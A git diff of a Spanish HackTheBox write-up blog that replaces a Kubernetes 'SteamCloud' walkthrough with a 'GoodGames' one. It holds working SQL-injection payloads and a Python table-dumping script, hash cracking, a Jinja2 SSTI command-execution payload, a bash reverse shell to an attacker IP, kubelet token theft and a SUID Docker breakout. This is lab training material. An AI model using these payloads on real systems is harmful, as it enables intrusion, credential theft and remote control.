@@ -1,8 +1,8 @@
 ---
-title: SteamCoud
-published: 2025-03-13
+title: GoodGames | Linux
+published: 2025-03-02
 image: "./logo.png"
-tags: [Easy, Kubernetes, YAML POD RCE, eWPTXv2, OSWE]
+tags: [Easy, Linux, SQLi, Hash Cracking, Password Reuse, SSTI, Docker Breakout, eJPT, eWPT, eCPPTv3, OSCP]
 category: HackTheBox
 ---
 
@@ -10,459 +10,261 @@ category: HackTheBox
 
 ### Técnicas vistas
 
-- Kubernetes API Enumeration (kubectl)
-- Kubelet API Enumeration (kubeletctl)
-- Command Execution through kubeletctl on the containers
-- Cluster Authentication (ca.crt/token files) with kubectl
-- Creating YAML file for POD creation
-- Executing commands on the new POD
-- Reverse Shell through YAML file while deploying the POD
+- SQLI (Error Based)
+- Hash Cracking Weak Algorithms
+- Password Reuse
+- Server Side Template Injection (SSTI)
+- Docker Breakout (Privilege Escalation) [PIVOTING]
 
 ### Preparación
 
-- eWPTXv2
-- OSWE
+- eJPT  
+- eWPT  
+- eCPPTv3  
+- OSCP (Escalada)
 
 ***
 
 ## Reconocimiento
 
-Empezaremos sacando los puertos abiertos de la máquina con el comando **scan**.
+Empezaremos con un reconocimiento a los puertos abiertos de las máquinas, para ver que servicios y versiones corren.
 
-```sh
-# Uso: scan <IP>
-scan () {
-	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
-}
-```
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDvqjC7BXE47dIDCZPTYs%2F1.png?alt=media&#x26;token=8ce921c6-8e87-4708-b027-e060e70eb495" alt=""><figcaption></figcaption></figure>
 
-Podemos ver los puertos:
+Vemos que solo hay un puerto abierto, el **HTTP**, y que tiene por detrás **python3**, vamos a hacer un **whatweb** para ver que más encontramos.
 
-```
-# Nmap 7.95 scan initiated Tue Mar 11 23:56:10 2025 as: /usr/lib/nmap/nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn -oG nmap/AllPorts 10.10.11.133
-# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
-Host: 10.10.11.133 ()   Status: Up
-Host: 10.10.11.133 ()   Ports: 22/open/tcp//ssh///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10249/open/tcp/////, 10250/open/tcp/////, 10256/open/tcp/////    Ignored State: closed (65528)
-# Nmap done at Tue Mar 11 23:56:22 2025 -- 1 IP address (1 host up) scanned in 12.14 seconds
-```
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fk3k2Jb5QVxSPx0W9hcqS%2F2.png?alt=media&#x26;token=9c4b5b85-eded-4811-8d2a-c2e14b1a8536" alt=""><figcaption></figcaption></figure>
 
-Con la función **extractPorts** de el maestro s4vitar que nos permitirá copiar los puertos al clpiboard.
+Confirmamos lo mismo, vamos a ver que hay en la web.
 
-```sh
-extractPorts () {
-	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
-	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
-	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
-	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
-	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
-	echo $ports | tr -d '\n' | xclip -sel clip
-	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
-	/bin/batcat --paging=never extractPorts.tmp
-	rm extractPorts.tmp
-}
-```
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FfNS1G2BTaTkYJDr3LeKF%2F3.png?alt=media&#x26;token=cbdc0b40-34ae-4b0f-ad29-c8d4daa41188" alt=""><figcaption></figcaption></figure>
 
-Con **nmap** haremos un escaneo más exaustivo a los servicios y versiones que corren en cada puerto.
+Parece una web de juegos, vamos a añadir su dominio al /etc/hosts, y seguir investigando a ver si hay algo interesante. Vemos que hay panel de Login y de Registro, vamos a crear una cuenta.
 
-```
-sudo nmap -sCV -p22,2379,2380,8443,10249,10250,10256 -oN nmap/Scan 10.10.11.13
-```
-
-```
-# Nmap 7.95 scan initiated Tue Mar 11 23:56:50 2025 as: /usr/lib/nmap/nmap -sCV -p22,2379,2380,8443,10249,10250,10256 -oN nmap/Scan 10.10.11.133
-Nmap scan report for 10.10.11.133
-Host is up (0.042s latency).
-
-PORT      STATE SERVICE          VERSION
-22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
-|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
-|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
-2379/tcp  open  ssl/etcd-client?
-| tls-alpn: 
-|_  h2
-| ssl-cert: Subject: commonName=steamcloud
-| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
-| Not valid before: 2025-03-11T18:28:05
-|_Not valid after:  2026-03-11T18:28:05
-|_ssl-date: TLS randomness does not represent time
-2380/tcp  open  ssl/etcd-server?
-| tls-alpn: 
-|_  h2
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=steamcloud
-| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
-| Not valid before: 2025-03-11T18:28:05
-|_Not valid after:  2026-03-11T18:28:06
-8443/tcp  open  ssl/http         Golang net/http server
-| tls-alpn: 
-|   h2
-|_  http/1.1
-|_ssl-date: TLS randomness does not represent time
-|_http-title: Site doesn't have a title (application/json).
-| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
-| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
-| Not valid before: 2025-03-10T18:28:03
-|_Not valid after:  2028-03-10T18:28:03
-| fingerprint-strings: 
-|   FourOhFourRequest: 
-|     HTTP/1.0 403 Forbidden
-|     Audit-Id: 4a22f86e-0922-48f9-ba92-6ed77af8e2f0
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
-|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
-|     Date: Tue, 11 Mar 2025 22:57:03 GMT
-|     Content-Length: 212
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot get path \"/nice ports,/Trinity.txt.bak\"","reason":"Forbidden","details":{},"code":403}
-|   GetRequest: 
-|     HTTP/1.0 403 Forbidden
-|     Audit-Id: 3dfed714-08b4-41c5-96d9-417ffdf6d503
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
-|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
-|     Date: Tue, 11 Mar 2025 22:57:03 GMT
-|     Content-Length: 185
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot get path \"/\"","reason":"Forbidden","details":{},"code":403}
-|   HTTPOptions: 
-|     HTTP/1.0 403 Forbidden
-|     Audit-Id: 36c41be9-a1e6-431a-83ea-0d69230fa792
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     X-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e
-|     X-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b
-|     Date: Tue, 11 Mar 2025 22:57:03 GMT
-|     Content-Length: 189
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User \"system:anonymous\" cannot options path \"/\"","reason":"Forbidden","details":{},"code":403}
-10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-| tls-alpn: 
-|   h2
-|_  http/1.1
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-|_ssl-date: TLS randomness does not represent time
-| ssl-cert: Subject: commonName=steamcloud@1741717687
-| Subject Alternative Name: DNS:steamcloud
-| Not valid before: 2025-03-11T17:28:07
-|_Not valid after:  2026-03-11T17:28:07
-10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=3/11%Time=67D0BFBF%P=x86_64-pc-linux-gnu%r(GetRequest,22F,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 3dfed714-08b4-41c5-96d9-417ffdf6d503\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTPOptions,233,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 36c41be9-a1e6-431a-83ea-0d69230fa792\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot options path \\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhFourRequest,24A,"HTTP/1\.0 403 Forbidden\r\nAudit-Id: 4a22f86e-0922-48f9-ba92-6ed77af8e2f0\r\nCache-Control: no-cache, private\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid: 5835eec4-f6d4-4b4e-83f9-59cac09a037e\r\nX-Kubernetes-Pf-Prioritylevel-Uid: 7619580d-5c27-4bf1-8ebd-48658fdcc56b\r\nDate: Tue, 11 Mar 2025 22:57:03 GMT\r\nContent-Length: 212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden: User \\\"system:anonymous\\\" cannot get path \\\"/nice ports,/Trinity.txt.bak\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n");
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Tue Mar 11 23:57:29 2025 -- 1 IP address (1 host up) scanned in 38.87 seconds
-```
-
-### Kubernetes 
-
-Podemos ver por varios sitios que usa **Kubernetes** (_k8s_), un software de código abierto que sirve para implementar y administrar contenedores a gran escala. Pero si nos metemos por el puerto 8443 no podremos ver gran cosa solo un error.
-
-Vamos a instalar las herramientas necesarias con el siguiente comando:
-
-
-```
-sudo wget https://github.com/cyberark/kubeletctl/releases/download/v1.13/kubeletctl_linux_amd64 && sudo chmod a+x ./kubeletctl_linux_amd64 && sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
-```
-
-
-Ahora podremos listar información de los procesos que están corriendo en kubernete.
-
-```
-kubeletctl pods -s 10.10.11.133
-```
-
-```
-┌────────────────────────────────────────────────────────────────────────────────┐
-│                                Pods from Kubelet                               │
-├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
-│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 4 │ kube-proxy-xftvs                   │ kube-system │ kube-proxy              │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 5 │ coredns-78fcd69978-lc4mh           │ kube-system │ coredns                 │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 6 │ nginx                              │ default     │ nginx                   │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
-│   │                                    │             │                         │
-├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
-│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
-│   │                                    │             │                         │
-└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
-```
-
-Al ver que hay un pod por defecto en el sistema que es **nginx**, podemos intentar ejecutar comandos con el siguiente comando:
-
-```
-kubeletctl -s 10.10.11.133 exec "id" -p nginx -c nginx
-```
-
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FMVh6Lwey8QChlnwo0AcE%2F1.png?alt=media&#x26;token=b15cdbda-5e13-4999-a45c-c45aafafa97f" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FTCPfIev5xSpqRHfSvtAn%2F4.png?alt=media&#x26;token=e20fa464-d398-47a3-a8f6-055e0cab5539" alt=""><figcaption></figcaption></figure>
 
 ## Explotación
 
-Sabiendo esto podemos poner como payload `/bin/shell` para ejecutar una shell interactiva.
+
+
+Vemos un formulario para poder poner nuestro email, pero tiene pinta que no funciona, por lo que vamos a seguir investigando por otro lado. Podemos intentar un **SQL Injection** en el panel de Login:
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FUY8c30TxFfgYiaOD1HBY%2F6.png?alt=media&#x26;token=79e4ccb1-ead6-43d6-b772-4c87604fd2a0" alt=""><figcaption></figcaption></figure>
+
+Nos lo impide la **validación del email**, por lo que podemos intentar hacerlo por consola.
+
+
+```bash
+curl -s -X POST "http://goodgames.htb/login" -d "email=' or 1=1-- -&password=' or 1=1-- -" | html2text
+
+[GoodGames]
+****** Login Successful ******
+***** Welcome adminZelpro *****
+Redirecting you to profile page...
+Return to Homepage
+*** Search ***
+[search              ]
+*** Sign In ***
+Use email and password:
+[Unknown INPUT type]
+[********************]
+Or social account:
+Sign In
+Forgot your password?
+Not a member? Sign up
+```
+
+
+Podemos ver que funciona. Vamos a hacerlo con **burpsuite** para poder verlo en el navegador.
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FQcyKvDsoFzVhptvv7Iqa%2F7.png?alt=media&#x26;token=7a39b24f-8f1c-49f3-aaeb-ea8840a52954" alt=""><figcaption></figcaption></figure>
+
+Vamos a ver que más cosas podemos encontrar.
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FU4TuteDwp1olOEc7ZWK5%2F8.png?alt=media&#x26;token=42d5060f-dc67-40cc-ac3c-f206adc59afb" alt=""><figcaption></figcaption></figure>
+
+También está usando **VHOST** por lo que lo añadiremos al /etc/hosts.
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fshr62KO5pHnds9HHCt8h%2F9.png?alt=media&#x26;token=2f99dfec-cb91-4e4e-b80e-cf2d86067380" alt=""><figcaption></figcaption></figure>
+
+En este panel no podemos hacer **SQL Injection**, pero podemos volver al paso anterior y enumerar más información por si podemos encontrar información de otros usuarios o alguna cosa. Vamos a hacer un script en python.
+
+<pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python">#!/usr/bin/python3  
+  
+import requests  
+import sys  
+import re   
+<strong>  
+</strong># in this case are 4 columns  
+def make_request(url: str) ->None:  
+for x in range(100, 0, -1):  
+ress = requests.post(url=url, data={"email": f"' order by {x}-- -", "password": "test"})  
+  
+if len(ress.text) != 33490:  
+print("the number of columns inside the table ", x)  
+return  
+  
+def make_sqli():  
+url = "http://goodgames.htb/login"  
+  
+sqli_data = [  
+"' union select 1,2,3,@@version-- -", # database version  
+"' union select 1,2,3,schema_name from information_schema.schemata-- -", # the databases  
+"' union select 1,2,3,table_name from information_schema.tables where table_schema='main'-- -", # the tabales  
+"' union select 1,2,3,column_name from information_schema.columns where table_name='user'-- -", # the columns  
+"' union select 1,2,3,group_concat(id,0x3a,name,0x3a,password,0x3a,email) from user-- -"] # the whole content in that table  
+  
+for x in sqli_data:  
+data = {"email": x, "password": "test"}  
+  
+response = requests.post(url=url, data=data)  
+  
+data = response.text  
+  
+value = re.findall(r'\>Welcome (.*)\&#x3C;', data)  
+print(value[0])  
+  
+def main():  
+try:  
+make_sqli()  
+except Exception as e:  
+print(str(e))  
+sys.exit(1)  
+
+except KeyboardInterrupt:  
+sys.exit(0)  
+  
+if __name__ == "__main__":  
+main()
+</code></pre>
+
+Y vemos que ejecutándolo muestra:
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fd2tpo2rsBGtb7WPqQxI5%2F10.png?alt=media&#x26;token=352be86e-5338-4f16-bb5b-00aaf5b97099" alt=""><figcaption></figcaption></figure>
+
+Vamos a intentar crackear ese **hash** con **john the ripper**:
 
 ```
-kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F8GUPe6vlLjaBoOAUogZR%2F2.png?alt=media&#x26;token=20efa5fa-125a-4973-b789-1c38825593a4" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FWA1wZDPrVqnWF9X6NH0S%2F11.png?alt=media&#x26;token=c156262b-bbcb-4048-9cad-9aa3a70cd1a4" alt=""><figcaption></figcaption></figure>
 
-Ya tendríamos la user flag.
+Y nos da como resultado superadministrador.
 
-### Escalada de privilegios
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FBTj5cEfEwBFUsMGFeX0S%2F12.png?alt=media&#x26;token=3990f33a-8329-4d93-8abb-f878ec70aea7" alt=""><figcaption></figcaption></figure>
 
-Ya que se sabe que se puede obtener información del sistema por medio de los comandos anteriores, se procede a buscar información importante en el sistema. Actualmente hay una página llamada HackTricks, esta nos permite obtener información sobre formas de hackeo. En este caso como estamos tocando temas de Kubernetes, se procede a realizar la busqueda sobre este tema y se observar que se encuentra la siguiente información.
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FCqYcCLCF9IyA5yNR0dKv%2F13.png?alt=media&#x26;token=5981fe98-221c-4fba-916d-af42b8a76d3a" alt=""><figcaption></figcaption></figure>
 
-[Kubernetes Tokens](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#kubernetes-tokens), esto nos indica que si se tiene comprometido el POD y se puede ejecutar comandos, se puede agregar un token ademas de traer la información del sistema.
+Hay un panel de ajustes en el que podemos modificar apartados de nuestro perfil y luego que se vean reflejados. Esto puede dar lugar a un **SSTI** (_Server Side Template Injection_), vamos a comprobarlo:
 
-Las rutas donde se pueden encontrar este token son:
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F5ISQJgaE3JM7Kxm2AUrL%2F14.png?alt=media&#x26;token=ddc4a0bd-1a59-44fc-8ff1-5d44d550fcb0" alt=""><figcaption></figcaption></figure>
 
-* /run/secrets/kubernetes.io/serviceaccount
-* /var/run/secrets/kubernetes.io/serviceaccount
-* /secrets/kubernetes.io/serviceaccount
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FHselNjYswgAmKz4dTgib%2F15.png?alt=media&#x26;token=db8957e0-3452-4b69-926f-995fba8e9a42" alt=""><figcaption></figcaption></figure>
 
-Se procede a probar una por una y vemos el siguiente resultado.
+Efectivamente, podemos ver que es vulnerable. Esto puede dar lugar a una reverse shell, vamos a intentarlo con este payload:
+
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">{{ 
+<strong>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() 
+</strong>}}
+</code></pre>
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F2EyHn63pcD6nuAAlBPcM%2F16.png?alt=media&#x26;token=96f11879-0701-4ebf-8e2b-dfa813f5d9cb" alt=""><figcaption></figcaption></figure>
+
+Podemos ver que funciona, vamos a hacer lo mismo pero para la reverse shell:
+
+
+```bash
+{{ 
+self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"').read() 
+}}
+```
+
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Ff2qcACepuYnHh37qvpj5%2F17.png?alt=media&#x26;token=1e7a6c36-7833-4b8c-8aae-6b7dfcdb3c6c" alt=""><figcaption></figcaption></figure>
+
+Primero de todo vamos a hacernos la terminal interactiva con los siguientes comandos:
+
+
+```bash
+script /dev/null -c bash
+ctrl + z
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+
+Además de obtener la shell, parece que somos usuario root, vamos a investigar un poco. Hay un usuario llamado augustus y en su escritorio vemos la user flag:
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FVVMJPTmjPQ6xVbsM9EtB%2F18.png?alt=media&#x26;token=e8ce106c-c673-41d2-ba4b-e77383d1d61b" alt=""><figcaption></figcaption></figure>
+
+## Escalada de privilegios
+
+El problema es que en el directorio **root** no hay nada, parece que la root flag puede que esté escondida o que no esté aquí, vamos a investigar más.
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FIaSBENrEvlhgANOJdsMz%2F19.png?alt=media&#x26;token=a9d0d15a-9a21-497d-b1ae-8853dae93df8" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FFJksouqJDOrMftAoQZo1%2F21.png?alt=media&#x26;token=19661057-2165-4800-af71-4bd640b74540" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fmnd8s5AEro5oY47Hv6oF%2F22.png?alt=media&#x26;token=547a4510-2215-4ada-ac8a-a03f10432110" alt=""><figcaption></figcaption></figure>
+
+Vemos que tiene la IP **172.19.0.2**, por lo que la máquina real podría ser **172.19.0.1** ya que vemos que tiene **Docker** y normalmente la máquina real que genera el docker es esa, vamos a ver que puertos abiertos tiene con el siguiente comando:
+
+```bash
+for x in {1..1024}; do (echo >/dev/tcp/172.19.0.1/$x) &>/dev/null && echo "port $x open"; done
+```
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FMUoJ99Hbt7fpuQYw2gjz%2F20.png?alt=media&#x26;token=8ea7785e-c90f-494f-867a-9ab3bf927b59" alt=""><figcaption></figcaption></figure>
+
+Vamos a intentar conectarnos por SSH a esta máquina con la contraseña de antes (superadministrator):
+
+```bash
+ssh augustus@172.19.0.1
+```
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FWhnTSezidmzCAaKK9R6J%2F23.png?alt=media&#x26;token=450fc65a-c895-4de3-8678-8451ec7f7c34" alt=""><figcaption></figcaption></figure>
+
+Perfecto, ahora tocaría la escalada de privilegios. En este caso es un poco curiosa como se hace, porque tenemos un **Docker** con permisos **root** para la carpeta del usuario que corre el docker. Entonces si cogemos la shell del usuario augustus y desde el docker le cambiamos los permisos a root, y luego volvemos al usuario augustus, tendremos una **shell** con **root**:
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FDl2HW9ZfZyrdGGSbwCzT%2F24.png?alt=media&#x26;token=19cf0961-93cb-4ba6-8a8b-c8413bf9c70e" alt=""><figcaption></figcaption></figure>
+
+Primero nos copiamos la bash al directorio de augustus y nos salimos de la conexión SSH.
+
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FoRh808n9ENjxHLdSq9no%2F25.png?alt=media&#x26;token=a22aa0de-f736-4079-861a-cbfc378d85c9" alt=""><figcaption></figcaption></figure>
+
+Ahora desde el docker vemos que tiene los permisos de el usuario **augustus** (1000), asi que con el comando **chown**, la vamos a hacer nuestra (**root**):
 
 ```sh
-kubeletctl -s 10.10.11.133 exec "ls /run/secrets/kubernetes.io/serviceaccount" -p nginx -c nginx
-ca.crt  namespace  token
+chown root:root bash
 ```
 
-**¿Qué significa cada archivo?**
+<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FkGoi7T19Rw33xffEr7Ep%2F26.png?alt=media&#x26;token=2340895c-c78f-4205-82ef-0d74b7b9f2db" alt=""><figcaption></figcaption></figure>
 
-```
-ca.crt: Certificado por parte de kubernetes para comprobar las comunicaciones.
-namespace: Nombre actual de los espacios.
-token: Contiene el token del servicio actual.
-```
-
-Nos guardamos el token en una variable para tenerlo más a mano.
-
+Ahora si hacemos el mismo comando para ver los permisos vemos que nos pertenece:
 
 ```sh
-export token=$(kubeletctl -s 10.10.11.133 exec "cat /run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx)
+chmod 7444 bash
 ```
 
